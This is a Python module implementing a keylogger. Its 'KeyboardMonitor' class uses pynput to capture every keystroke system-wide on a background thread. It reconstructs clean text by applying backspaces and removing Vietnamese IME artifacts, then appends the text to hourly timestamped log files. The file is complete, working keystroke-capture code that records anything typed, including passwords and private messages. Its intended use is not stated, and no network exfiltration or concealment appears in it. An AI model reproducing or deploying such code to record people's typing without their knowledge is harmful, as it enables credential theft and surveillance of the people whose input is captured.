"""
Keyboard monitor module - tracks keystrokes using pynput.
Outputs clean, readable text (applies backspace, ignores noise keys).
"""

import time
import threading
from datetime import datetime
from pathlib import Path

try:
    from pynput import keyboard
except ImportError:
    keyboard = None


# Keys that produce no visible text and should be silently ignored
IGNORED_KEYS = {
    "Key.shift", "Key.shift_r",
    "Key.ctrl_l", "Key.ctrl_r",
    "Key.alt_l", "Key.alt_r", "Key.alt_gr",
    "Key.cmd", "Key.cmd_r",
    "Key.caps_lock", "Key.num_lock", "Key.scroll_lock",
    "Key.up", "Key.down", "Key.left", "Key.right",
    "Key.home", "Key.end", "Key.page_up", "Key.page_down",
    "Key.insert", "Key.delete",
    "Key.print_screen", "Key.pause", "Key.menu",
    "Key.esc",
}

# Add function keys F1-F24
for _i in range(1, 25):
    IGNORED_KEYS.add(f"Key.f{_i}")


class KeyboardMonitor:
    """Monitors keyboard input and logs clean readable text to files."""

    def __init__(self, config: dict, base_dir: Path, logger):
        self.config = config["keylogger"]
        self.base_dir = base_dir
        self.logger = logger
        self.output_dir = base_dir / self.config["output_dir"]
        self.flush_interval = self.config["flush_interval_seconds"]
        self._running = False
        self._listener = None
        self._flush_thread = None
        # Buffer holds actual characters, backspace removes from it
        self._text_buffer = []
        self._lock = threading.Lock()
        self._last_flush_time = None

    def _get_log_file(self) -> Path:
        """Get current log file path (one file per hour)."""
        now = datetime.now()
        filename = f"keys_{now.strftime('%Y%m%d_%H')}.log"
        return self.output_dir / filename

    def _on_press(self, key):
        """Callback for key press events. Builds clean text buffer."""
        try:
            key_str = str(key)

            with self._lock:
                if hasattr(key, 'char') and key.char:
                    # Regular visible character (a, b, ư, á, ...)
                    if key.char == '\x01':  # Ctrl+A and similar
                        return
                    self._text_buffer.append(key.char)

                elif key_str == "Key.space":
                    self._text_buffer.append(" ")

                elif key_str == "Key.enter":
                    self._text_buffer.append("\n")

                elif key_str == "Key.tab":
                    # Skip tabs (noise)
                    pass

                elif key_str == "Key.backspace":
                    # Actually delete the last character from buffer
                    if self._text_buffer:
                        self._text_buffer.pop()

                elif key_str in IGNORED_KEYS:
                    # Silently skip all noise keys
                    pass

                # else: unknown key, silently ignore

        except Exception as e:
            self.logger.error(f"Key handler error: {e}")

    def _clean_vietnamese_typing(self, text: str) -> str:
        """Removes Unikey/EVKey typing artifacts (e.g. 'vieêết' -> 'viết')."""
        import unicodedata
        
        if not text:
            return text
            
        def get_base_char(c: str) -> str:
            if c == 'đ': return 'd'
            if c == 'Đ': return 'D'
            return unicodedata.normalize('NFD', c)[0]

        def is_modified_vn(c: str) -> bool:
            if c in ('đ', 'Đ'): return True
            nfd = unicodedata.normalize('NFD', c)
            return len(nfd) > 1 and unicodedata.combining(nfd[1])

        chars = list(text)
        i = 1
        while i < len(chars):
            c_prev = chars[i-1]
            c_curr = chars[i]
            
            # If current character is a modified Vietnamese character
            if is_modified_vn(c_curr):
                base_prev = get_base_char(c_prev).lower()
                base_curr = get_base_char(c_curr).lower()
                
                # If they share the same base letter (e.g., 'a' and 'ả', 'e' and 'ê')
                if base_prev == base_curr and base_curr in 'aeiouyd':
                    chars.pop(i-1)
                    if i > 1:
                        i -= 1
                    continue
            i += 1
            
        return "".join(chars)

    def _flush_buffer(self):
        """Write buffered text to file as clean readable text."""
        with self._lock:
            if not self._text_buffer:
                return
            text = "".join(self._text_buffer)
            self._text_buffer.clear()

        # Clean Vietnamese IME typing artifacts
        text = self._clean_vietnamese_typing(text)

        # Skip if only whitespace
        stripped = text.strip()
        if not stripped:
            return

        log_file = self._get_log_file()
        timestamp = datetime.now().strftime("%H:%M:%S")

        try:
            with open(log_file, "a", encoding="utf-8") as f:
                f.write(f"[{timestamp}] {text}\n")

            self.logger.debug(f"Flushed text to {log_file.name}")

        except Exception as e:
            self.logger.error(f"Flush error: {e}")

    def _flush_loop(self):
        """Periodically flush the text buffer."""
        while self._running:
            time.sleep(self.flush_interval)
            self._flush_buffer()

    def start(self):
        """Start the keyboard monitor."""
        if not self.config["enabled"]:
            self.logger.info("Keyboard monitor is disabled in config.")
            return

        if keyboard is None:
            self.logger.error("pynput not installed. Run: pip install pynput")
            return

        self.output_dir.mkdir(parents=True, exist_ok=True)
        self._running = True

        # Start keyboard listener
        self._listener = keyboard.Listener(on_press=self._on_press)
        self._listener.daemon = True
        self._listener.start()

        # Start flush thread
        self._flush_thread = threading.Thread(
            target=self._flush_loop, daemon=True, name="keylog-flush-thread"
        )
        self._flush_thread.start()

        self.logger.info(
            f"Keyboard monitor started (flush every {self.flush_interval}s)"
        )

    def stop(self):
        """Stop the keyboard monitor and flush remaining buffer."""
        self._running = False

        if self._listener:
            self._listener.stop()

        # Final flush
        self._flush_buffer()

        if self._flush_thread and self._flush_thread.is_alive():
            self._flush_thread.join(timeout=5)

        self.logger.info("Keyboard monitor stopped.")
